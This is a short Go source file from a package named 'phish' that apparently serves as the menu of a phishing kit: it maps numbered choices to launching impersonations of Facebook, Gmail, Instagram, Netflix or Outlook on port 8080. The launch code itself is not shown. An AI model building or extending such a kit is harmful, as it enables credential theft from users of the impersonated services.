package phish

import "os"

func Interact(selectedOption int) {
	switch selectedOption {
	case 1:
		Launch("Facebook", 8080)
	case 2:
		Launch("Gmail", 8080)
	case 3:
		Launch("Instagram", 8080)
	case 4:
		Launch("Netflix", 8080)
	case 5:
		Launch("Outlook", 8080)
	default:
		os.Exit(1)
	}
}
